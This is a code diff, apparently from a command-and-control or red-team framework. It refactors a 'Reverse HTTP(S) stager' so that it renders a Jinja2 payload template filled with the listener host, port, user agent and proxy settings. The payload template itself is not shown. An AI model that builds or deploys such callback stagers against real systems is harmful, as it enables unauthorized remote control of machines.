@@ -1,18 +1,53 @@
 import os
-from ..base_stager import BaseStager
-from Utils.options import DefaultStagerPool, Option, StringType, AddressType, IntegerType, ChoiceType
 from typing import TYPE_CHECKING
+
+import jinja2
+from Utils.options import (AddressType, ChoiceType, DefaultStagerPool,
+                           IntegerType, Option, OptionPool, StringType)
+
+from ..base_stager import BasePayload, BaseStager
 
 if TYPE_CHECKING:
     from Database import StagerModel
 
 
+class PythonPayload(BasePayload):
+    supported_target_os = ["linux", "windows", "osx"]
+    supported_target_arch = ["x64", "x86"]
+    supported_server_os = ["linux", "windows"]
+    compiled = False
+    options = OptionPool()
+
+    @staticmethod
+    def generate_payload(stager_db: "StagerModel") -> tuple[bytes | str, bool]:
+        jinja2_env = jinja2.Environment(
+            loader=jinja2.FileSystemLoader(
+                os.path.dirname(os.path.abspath(__file__))),
+            trim_blocks=True,
+            lstrip_blocks=True,
+            autoescape=False
+        )
+        template = jinja2_env.get_template("stager.py.jinja2")
+        return template.render(
+            host=stager_db.listener.address,
+            port=stager_db.listener.port,
+            user_agent=stager_db.options["user-agent"],
+            proxy_address=stager_db.options["proxy_address"],
+            proxy_port=stager_db.options["proxy_port"],
+            proxy_auth=stager_db.options["proxy_auth"],
+            different_address=stager_db.options["different-address"]
+        ), False
+
+
 class Stager(BaseStager):
-    option_pool = DefaultStagerPool([
+    name = "http-reverse"
+    description = "Reverse HTTP(S) stager"
+    options = DefaultStagerPool([
         Option(
             name="Type",
-            description="The type of stager to generate",
-            type=ChoiceType([x.split(".")[0] for x in os.listdir("Server/Kits/http-reverse/payloads/")]),
+            description="The type of payload to generate",
+            type=ChoiceType([x.split(".")[0] for x in os.listdir(
+                "Kits/http-reverse/payloads/")]),
             default="python",
             required=True
         ),
@@ -51,10 +86,12 @@ class Stager(BaseStager):
             required=False
         )
     ])
+    payloads = {
+        "python": PythonPayload
+    }
 
-    def generate_stager(self, stager_db: "StagerModel") -> tuple[bytes | str, bool]: 
-        if stager_db.options["type"] == "python":
-            with open("Server/Kits/http-reverse/payloads/python.py", "r") as f:
-                stager = f.read()
-                
-                return f.read().replace("{{HOST}}", stager_db.listener.address).replace("{{PORT}}", str(stager_db.listener.port)), False
+    def generate_stager(self, stager_db: "StagerModel") -> tuple[bytes | str, bool]:
+        if stager_db.payload_type not in self.payloads:
+            raise ValueError("Invalid payload type")
+
+        return self.payloads[stager_db.payload_type].generate_payload(stager_db)
